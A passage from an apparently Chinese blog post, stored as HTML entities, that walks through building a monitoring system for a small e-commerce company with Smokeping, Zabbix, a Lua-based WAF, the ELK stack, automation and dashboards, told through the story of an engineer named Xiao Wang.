;&#x4EBA;&#x6570;&#x3001;&#x751A;&#x81F3;&#x5546;&#x54C1;&#x4EA4;&#x6613;&#x989D;&#x7B49;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/8.png\" alt=\"&#x56FE;&#x7247;8\"></p>\n<p>&#x800C;&#x4E14;&#xFF0C;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x662F;&#x8FD0;&#x7EF4;&#x5411;&#x8FD0;&#x8425;&#x62D3;&#x5C55;&#x7684;&#x5FC5;&#x7ECF;&#x4E4B;&#x8DEF;&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x638C;&#x63E1;&#x516C;&#x53F8;&#x7AD9;&#x70B9;&#x7684;&#x5404;&#x79CD;&#x8BBF;&#x95EE;&#x8BE6;&#x60C5;&#x3002;</p>\n<h4 id=\"2-6-&#x7F51;&#x7EDC;&#x76D1;&#x63A7;\"><a href=\"#2-6-&#x7F51;&#x7EDC;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.6 &#x7F51;&#x7EDC;&#x76D1;&#x63A7;\"></a>2.6 &#x7F51;&#x7EDC;&#x76D1;&#x63A7;</h4><p>&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x5168;&#x56FD;&#x7528;&#x6237;&#x7684;&#x7535;&#x5546;&#x7F51;&#x7AD9;&#xFF0C;&#x65F6;&#x523B;&#x638C;&#x63E1;&#x5404;&#x5730;&#x5230;&#x673A;&#x623F;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x662F;&#x5C0F;&#x738B;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x76EE;&#x6807;&#x3002;</p>\n<p>&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x5EFA;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x5FC5;&#x987B;&#x8981;&#x8003;&#x8651;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x9488;&#x5BF9;&#x6709;&#x591A;&#x4E2A;&#x673A;&#x623F;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x5404;&#x4E2A;&#x673A;&#x623F;&#x4E4B;&#x95F4;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#xFF0C;&#x673A;&#x623F;&#x548C;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x638C;&#x63E1;&#x8FD9;&#x4E9B;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x501F;&#x52A9;&#x4E8E;&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x5DE5;&#x5177;Smokeping&#x3002;</p>\n<p>Smokeping &#x662F;rrdtool&#x7684;&#x4F5C;&#x8005;Tobi Oetiker&#x7684;&#x4F5C;&#x54C1;&#xFF0C;&#x662F;&#x7528;Perl&#x5199;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x76D1;&#x89C6;&#x7F51;&#x7EDC;&#x6027;&#x80FD;&#xFF0C;www &#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#xFF0C;dns&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x7B49;&#xFF0C;&#x4F7F;&#x7528;rrdtool&#x7ED8;&#x56FE;&#xFF0C;&#x800C;&#x4E14;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x76F4;&#x63A5;&#x4ECE;&#x591A;&#x4E2A;agent&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7684;&#x6C47;&#x603B;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x76D1;&#x63A7;&#x70B9;&#x6BD4;&#x8F83;&#x5C11;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x5F88;&#x591A;&#x5546;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#xFF0C;&#x6BD4;&#x5982;&#x76D1;&#x63A7;&#x5B9D;&#x3001;&#x57FA;&#x8C03;&#x3001;&#x535A;&#x745E;&#x7B49;&#x3002;&#x540C;&#x65F6;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x63D0;&#x4F9B;&#x5546;&#x8FD8;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x76D1;&#x63A7;CDN&#x7684;&#x72B6;&#x6001;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/9.png\" alt=\"&#x56FE;&#x7247;9\"></p>\n<h4 id=\"2-7-&#x5B89;&#x5168;&#x76D1;&#x63A7;\"><a href=\"#2-7-&#x5B89;&#x5168;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.7 &#x5B89;&#x5168;&#x76D1;&#x63A7;\"></a>2.7 &#x5B89;&#x5168;&#x76D1;&#x63A7;</h4><p>&#x867D;&#x7136;iptables&#x5E2E;&#x52A9;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4E86;&#x56DB;&#x5C42;&#x7684;&#x5B89;&#x5168;&#x9632;&#x62A4;&#xFF0C;&#x4F46;&#x662F;&#x9488;&#x5BF9;&#x4E03;&#x5C42;&#x7684;Web&#x5C42;&#x9762;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x4F7F;&#x7528;Nginx + Lua&#x7F16;&#x5199;&#x4E86;&#x4E00;&#x4E2A;WAF&#xFF0C;&#x7136;&#x540E;&#x628A;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x4E86;Elasticsearch&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;kibana&#x53EF;&#x4EE5;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5C55;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x653B;&#x51FB;&#x7C7B;&#x578B;&#x7684;&#x7EDF;&#x8BA1;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#x5C0F;&#x738B;&#x5B66;&#x4E60;&#x4F7F;&#x7528;python&#x8FD8;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x722C;&#x866B;&#x5B9A;&#x671F;&#x626B;&#x63CF;github&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x516C;&#x53F8;&#x76F8;&#x5173;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x4EE5;&#x514D;&#x540C;&#x4E8B;&#x5206;&#x4EAB;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4E0D;&#x5C0F;&#x5FC3;&#x6D89;&#x53CA;&#x5230;&#x654F;&#x611F;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/10.png\" alt=\"&#x56FE;&#x7247;10\"></p>\n<p>&#xFF08;&#x56FE;&#x7247;&#x6765;&#x6E90;<a href=\"https://github.com/loveshell/ngx_lua_waf&#xFF09;\">https://github.com/loveshell/ngx_lua_waf&#xFF09;</a></p>\n<h4 id=\"2-8-&#x4E1A;&#x52A1;&#x76D1;&#x63A7;\"><a href=\"#2-8-&#x4E1A;&#x52A1;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.8 &#x4E1A;&#x52A1;&#x76D1;&#x63A7;\"></a>2.8 &#x4E1A;&#x52A1;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x518D;&#x53BB;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#xFF0C;&#x521A;&#x8D70;&#x5230;&#x95E8;&#x53E3;&#x88AB;&#x603B;&#x7ECF;&#x7406;&#x78B0;&#x4E0A;&#x4E86;&#xFF0C;&#x5F20;&#x603B;&#x8BF4;&#xFF1A;&#x5C0F;&#x738B;&#x554A;&#xFF0C;&#x4F60;&#x4EEC;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x4F60;&#x6700;&#x8FD1;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x5E72;&#x7684;&#x4E0D;&#x9519;&#xFF0C;&#x4F60;&#x7ED9;&#x6211;&#x8BF4;&#x4E0B;&#xFF0C;&#x54B1;&#x4EEC;&#x73B0;&#x5728;10&#x70B9;&#x7684;&#x65F6;&#x5019;&#x603B;&#x8BA2;&#x5355;&#x662F;&#x591A;&#x5C11;&#xFF0C;&#x6BCF;&#x5206;&#x949F;&#x5E73;&#x5747;&#x8BA2;&#x5355;&#x6709;&#x591A;&#x5C11;&#xFF1F;</p>\n<p>&#x5C0F;&#x738B;&#x53C8;&#x8499;&#x4E86;&#xFF0C;&#x6211;&#x81EA;&#x5DF1;&#x4E5F;&#x66FE;&#x7ECF;&#x5C31;&#x662F;&#x90A3;&#x4E2A;&#x5C0F;&#x738B;&#xFF01;</p>\n<p>&#x6CA1;&#x6709;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x76D1;&#x63A7;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x901A;&#x5E38;&#x5728;&#x6211;&#x4EEC;&#x505A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5FC5;&#x987B;&#x5C06;&#x6211;&#x4EEC;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x9608;&#x503C;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x901A;&#x77E5;&#x3002;</p>\n<p>&#x6BD4;&#x5982;&#x6BCF;&#x5206;&#x949F;&#x7684;&#x8BA2;&#x5355;&#x3001;&#x6BCF;&#x5206;&#x949F;&#x6CE8;&#x518C;&#x3001;&#x65E5;&#x6D3B;&#x7528;&#x6237;&#x3001;&#x77ED;&#x4FE1;&#x4F7F;&#x7528;&#x91CF;&#x7B49;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x5230;Zabbix&#x4E0A;&#x3002;</p>\n<p>&#x6CE8;&#xFF1A;&#x7531;&#x4E8E;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#x56FE;&#x8868;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x9690;&#x79C1;&#x7684;&#x6570;&#x636E;&#x592A;&#x591A;&#xFF0C;&#x5C31;&#x4E0D;&#x622A;&#x56FE;&#x4E86;&#x3002;</p>\n<h4 id=\"2-9-&#x65E5;&#x5FD7;&#x76D1;&#x63A7;\"><a href=\"#2-9-&#x65E5;&#x5FD7;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.9 &#x65E5;&#x5FD7;&#x76D1;&#x63A7;\"></a>2.9 &#x65E5;&#x5FD7;&#x76D1;&#x63A7;</h4><p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x4EA7;&#x751F;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x6709;&#x5E94;&#x7528;&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x3001;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x6709;&#x8FD0;&#x884C;&#x65E5;&#x5FD7;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ELK&#x6765;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x65E5;&#x5FD7;&#x6765;&#x8BF4;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#x5C31;&#x662F;&#x6536;&#x96C6;&#x3001;&#x5B58;&#x50A8;&#x3001;&#x67E5;&#x8BE2;&#x3001;&#x5C55;&#x793A;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6B63;&#x597D;&#x6709;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF1A;</p>\n<p>logstash&#xFF08;&#x6536;&#x96C6;&#xFF09;<br>elasticsearch&#xFF08;&#x5B58;&#x50A8;+&#x641C;&#x7D22;&#xFF09;<br>kibana&#xFF08;&#x5C55;&#x793A;&#xFF09;<br>&#x6211;&#x4EEC;&#x5C06;&#x8FD9;&#x4E09;&#x4E2A;&#x7EC4;&#x5408;&#x8D77;&#x6765;&#x7684;&#x6280;&#x672F;&#x79F0;&#x4E4B;&#x4E3A;ELK Stack&#xFF0C;&#x6240;&#x4EE5;&#x8BF4;ELK Stack&#x6307;&#x7684;&#x662F;Elasticsearch&#x3001;Logstash&#x3001;Kibana&#x6280;&#x672F;&#x6808;&#x7684;&#x7ED3;&#x5408;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x6536;&#x96C6;&#x4E86;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x90E8;&#x7F72;&#x66F4;&#x65B0;&#x6709;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#xFF0C;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x5728;kibana&#x4E0A;&#x770B;&#x5230;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix&#x6765;&#x8FDB;&#x884C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8FC7;&#x6EE4;&#x6765;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/11.png\" alt=\"&#x56FE;&#x7247;11\"></p>\n<h4 id=\"2-10-&#x81EA;&#x52A8;&#x5316;\"><a href=\"#2-10-&#x81EA;&#x52A8;&#x5316;\" class=\"headerlink\" title=\"2.10 &#x81EA;&#x52A8;&#x5316;\"></a>2.10 &#x81EA;&#x52A8;&#x5316;</h4><p>&#x7ECF;&#x8FC7;&#x52AA;&#x529B;&#xFF0C;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4ECE;&#x76D1;&#x63A7;&#x83DC;&#x9E1F;&#x5230;&#x5934;&#x8111;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x9006;&#x88AD;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5927;&#x89C4;&#x6A21;&#x7684;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x81EA;&#x52A8;&#x5316;&#x76D1;&#x63A7;&#xFF0C;&#x90A3;&#x4E48;&#x624B;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6050;&#x6016;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>\n<p>&#x81EA;&#x52A8;&#x5316;&#x7684;&#x65B9;&#x6848;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x6709;&#x4E3B;&#x52A8;&#x548C;&#x88AB;&#x52A8;&#x4E0D;&#x540C;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x76F8;&#x5BF9;Zabbix&#x6765;&#x8BF4;&#x3002;</p>\n<p>&#x4E3B;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A;</p>\n<p>&#x6BD4;&#x5982;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x4E3B;&#x52A8;&#x7684;&#x5BF9;&#x5168;&#x7F51;&#x8FDB;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x7136;&#x540E;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76F8;&#x5173;&#x7684;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5F15;&#x7528;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x88AB;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A;</p>\n<p>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix API&#x8FDB;&#x884C;&#x88AB;&#x52A8;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x6DFB;&#x52A0;&#x3002;&#x6BD4;&#x5982;&#x4EE5;CMDB&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x5982;&#x679C;&#x68C0;&#x6D4B;&#x5230;&#x67D0;&#x670D;&#x52A1;&#x5668;&#x589E;&#x52A0;&#x4E86;Nginx&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4E48;&#x81EA;&#x52A8;&#x8C03;&#x7528;Zabbix API&#x6DFB;&#x52A0;&#x4E0A;Nginx&#x7684;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x771F;&#x6B63;&#x60F3;&#x505A;&#x5230;&#x66F4;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x786E;&#x5B9E;&#x65E0;&#x6CD5;&#x5F88;&#x597D;&#x7684;&#x6EE1;&#x8DB3;&#xFF0C;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x516C;&#x53F8;&#x90FD;&#x5F00;&#x59CB;&#x81EA;&#x5DF1;&#x5F00;&#x53D1;&#x81EA;&#x5DF1;&#x7684;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;&#x5C0F;&#x7C73;&#x5F00;&#x6E90;&#x7684;Open-Falcon&#x3002;</p>\n<p>&#x4E5F;&#x6709;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x5F00;&#x6E90;&#x7684;&#x76D1;&#x63A7;&#x6846;&#x67B6;&#x5982;Sensu&#x7B49;&#xFF0C;&#x518D;&#x52A0;&#x4E0A;influxdb grafana&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B9A;&#x5236;&#x7B26;&#x5408;&#x81EA;&#x5DF1;&#x4F01;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x3002;</p>\n<h4 id=\"2-11-&#x53EF;&#x89C6;&#x5316;\"><a href=\"#2-11-&#x53EF;&#x89C6;&#x5316;\" class=\"headerlink\" title=\"2.11 &#x53EF;&#x89C6;&#x5316;\"></a>2.11 &#x53EF;&#x89C6;&#x5316;</h4><p>&#x7ECF;&#x8FC7;&#x5C0F;&#x738B;&#x7684;&#x5404;&#x79CD;&#x52AA;&#x529B;&#xFF0C;&#x7EC8;&#x4E8E;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4F7F;&#x7528;Zabbix&#x6784;&#x5EFA;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x4E3A;&#x6B64;&#x8FD8;&#x505A;&#x4E00;&#x4E2A;&#x6F02;&#x4EAE;&#x7684;screen&#xFF0C;&#x6765;&#x8FDB;&#x884C;&#x5C55;&#x793A;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E00;&#x5929;&#x7A81;&#x7136;&#x8BA2;&#x5355;&#x91CF;&#x7279;&#x522B;&#x5C11;&#xFF0C;&#x5F20;&#x603B;&#x53C8;&#x4E00;&#x6B21;&#x5230;&#x4E86;&#x8FD0;&#x7EF4;&#x90E8;&#xFF0C;&#x4F46;&#x5931;&#x671B;&#x800C;&#x5F52;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x5E76;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8BA2;&#x5355;&#x91CF;&#x4E3A;&#x4EC0;&#x4E48;&#x51CF;&#x5C11;&#x4E86;&#xFF1F;</p>\n<p>&#x8FD0;&#x7EF4;&#x7684;&#x91CD;&#x8981;&#x76EE;&#x6807;&#x4E4B;&#x4E00;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x7684;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x4E1A;&#x52A1;&#x7684;&#x6CE2;&#x52A8;&#xFF0C;&#x5C31;&#x662F;&#x800D;&#x6D41;&#x6C13;&#x3002;&#x4E4B;&#x524D;&#x7684;&#x4E00;&#x5207;&#x52AA;&#x529B;&#x5728;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9886;&#x5BFC;&#x4E2D;&#x53D8;&#x5F97;&#x4E00;&#x6587;&#x4E0D;&#x503C;&#xFF01;&#xFF01;&#xFF01;</p>\n<p>&#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;</p>\n<p>&#x9762;&#x5411;&#x4F20;&#x7EDF;&#x8FD0;&#x7EF4;&#xFF1A;</p>\n<p>&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5B8C;&#x5584;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E13;&#x95E8;&#x7684;&#x4E1A;&#x52A1;&#x5206;&#x6790;&#x7CFB;&#x7EDF;&#xFF0C;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x548C;&#x8FD0;&#x7EF4;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#x3002;</p>\n<p>&#x68B3;&#x7406;&#x6E05;&#x695A;&#x5404;&#x4E2A;&#x5B50;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x6BD4;&#x5982;&#x5982;&#x679C;&#x7A81;&#x7136;&#x95F4;&#x6D41;&#x91CF;&#x589E;&#x52A0;&#x4E86;50M&#xFF0C;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x7684;&#x77E5;&#x9053;&#x8FD9;50M&#x6D41;&#x91CF;&#x5230;&#x4E86;&#x90A3;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x8BBF;&#x95EE;&#x7684;&#x54EA;&#x4E9B;URL&#xFF0C;&#x4EE5;&#x53CA;&#x8FD9;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002;</p>\n<p>&#x9762;&#x5411;DevOps&#xFF1A;</p>\n<p>&#x5C06;&#x6240;&#x6709;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x548C;&#x4E1A;&#x52A1;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x5173;&#x7CFB;&#x6811;&#xFF0C;&#x6BD4;&#x5982;&#x4E1A;&#x52A1;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7CFB;&#x7EDF;&#x3001;&#x6570;&#x636E;&#x5E93;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x63A8;&#x5E7F;&#x6D3B;&#x52A8;&#xFF08;&#x6D41;&#x91CF;&#x5206;&#x6790;&#xFF09;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x5F62;&#x6210;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x5173;&#x7CFB;&#x94FE;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x5E9E;&#x5927;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x4E1A;&#x52A1;&#x662F;&#x591A;&#x53D8;&#x7684;&#xFF0C;&#x5982;&#x4F55;&#x8BA9;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x9002;&#x5E94;&#x591A;&#x53D8;&#x7684;&#x4E1A;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x8270;&#x5DE8;&#x7684;&#x4EFB;&#x52A1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/12.png\" alt=\"&#x56FE;&#x7247;12\"></p>\n<h2 id=\"&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\"><a href=\"#&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\" class=\"headerlink\" title=\"&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\"></a>&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;</h2><p>&#x8BE5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x65E0;&#x8BBA;&#x600E;&#x4E48;&#x52AA;&#x529B;&#x589E;&#x52A0;&#xFF0C;&#x8FD8;&#x662F;&#x89C9;&#x5F97;&#x603B;&#x6709;&#x6F0F;&#x4E0B;&#x7684;&#x3002;</p>\n<p>&#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#x8FD8;&#x6709;&#x548C;&#x8FD0;&#x7EF4;&#x76F8;&#x5173;&#x7684;&#x9875;&#x9762;&#x6027;&#x80FD;&#x76D1;&#x63A7;&#xFF08;&#x9875;&#x9762;&#x8D44;&#x6E90;&#x6570;&#x91CF;&#x3001;DNS&#x89E3;&#x6790;&#x65F6;&#x95F4;&#x3001;&#x9996;&#x5C4F;&#x65F6;&#x95F4;&#x3001;&#x52A0;&#x8F7D;&#x6700;&#x6162;&#x7684;&#x8D44;&#x6E90;&#x3001;&#x4EA7;&#x751F;&#x963B;&#x585E;&#x7684;JS&#x7B49;&#xFF09;&#x3001;&#x4EE3;&#x7801;&#x76D1;&#x63A7;&#x3001;&#x4E0E;&#x8FD0;&#x7EF4;&#x65E0;&#x5173;&#x7684;&#x8206;&#x8BBA;&#x76D1;&#x63A7;&#x7B49;&#xFF0C;&#x5148;&#x8FD9;&#x4E48;&#x591A;&#x5427;&#xFF01;</p>\n<p>&#x597D;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x662F;&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;&#x5F15;&#x5165;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4ECE;&#x9762;&#x8BD5;&#x7ED3;&#x675F;&#x5427;&#xFF01;&#x4E0B;&#x6B21;&#x518D;&#x9047;&#x5230;&#x7C7B;&#x4F3C;&#x7684;&#x9762;&#x8BD5;&#x9898;&#xFF0C;&#x6211;&#x76F8;&#x4FE1;&#x8BFB;&#x8005;&#x5FC3;&#x91CC;&#x4E00;&#x5B9A;&#x67